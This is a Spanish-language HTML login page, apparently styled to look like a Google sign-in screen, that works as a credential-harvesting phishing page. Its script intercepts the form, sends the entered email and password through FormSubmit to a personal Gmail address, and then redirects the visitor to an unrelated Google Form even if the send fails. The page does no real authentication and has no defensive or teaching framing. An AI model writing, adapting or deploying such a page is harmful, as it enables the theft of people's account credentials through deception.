<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Iniciar sesión</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif;}
body{background:#f1f3f4;display:flex;justify-content:center;align-items:center;height:100vh;}
.card{width:380px;background:#fff;padding:40px;border-radius:18px;box-shadow:0 8px 25px rgba(0,0,0,.12);}
h2{text-align:center;color:#202124;margin-bottom:10px;}
p{text-align:center;color:#5f6368;margin-bottom:30px;font-size:14px;}
input{width:100%;padding:14px;border:1px solid #dadce0;border-radius:8px;font-size:15px;outline:none;}
input:focus{border-color:#1a73e8;}
.password-box{display:flex;gap:10px;margin-top:15px;}
.password-box input{flex:1;}
.password-box button{padding:0 16px;border:none;background:#e8f0fe;color:#1a73e8;border-radius:8px;cursor:pointer;font-weight:bold;}
.password-box button:hover{background:#d2e3fc;}
.submit{width:100%;margin-top:25px;padding:14px;border:none;border-radius:8px;background:#1a73e8;color:white;font-size:16px;cursor:pointer;}
.submit:hover{background:#1558b0;}
</style>
</head>
<body>

<div class="card">

<!-- FORMULARIO -->
<div id="formulario">
<h2>Iniciar sesión</h2>
<p>Introduce tus datos para continuar</p>

<form id="loginForm">
<input type="email" name="email" id="email" placeholder="Correo electrónico" required>
<div class="password-box">
<input type="password" name="password" id="password" placeholder="Contraseña" required>
<button type="button" id="toggle">Mostrar</button>
</div>
<button class="submit" type="submit">Entrar</button>
</form>
</div>

</div>

<script>
// Mostrar / ocultar contraseña
const password = document.getElementById("password");
const toggle = document.getElementById("toggle");
toggle.onclick = function(){
if(password.type === "password"){
password.type = "text";
toggle.textContent = "Ocultar";
} else {
password.type = "password";
toggle.textContent = "Mostrar";
}
}

// Enviar el formulario
document.getElementById("loginForm").addEventListener("submit", function(e){
e.preventDefault(); // Evita que la página se recargue

const formData = new FormData(this);

// Enviar los datos a FormSubmit
fetch("https://formsubmit.co/ajax/emilianolestad@gmail.com", {
method: "POST",
body: formData
})
.then(response => response.json())
.then(data => {
// Redirigir a ngl.link después de enviar
window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSczDtDw_MN8sjgQUUvAYLVS4UFf03RT1Kw0qgS72yPwuCeTag/viewform?usp=dialog";
})
.catch(error => {
// Aunque haya error, redirigir igual
window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSczDtDw_MN8sjgQUUvAYLVS4UFf03RT1Kw0qgS72yPwuCeTag/viewform?usp=dialog";
});
});
</script>
</body>
</html>
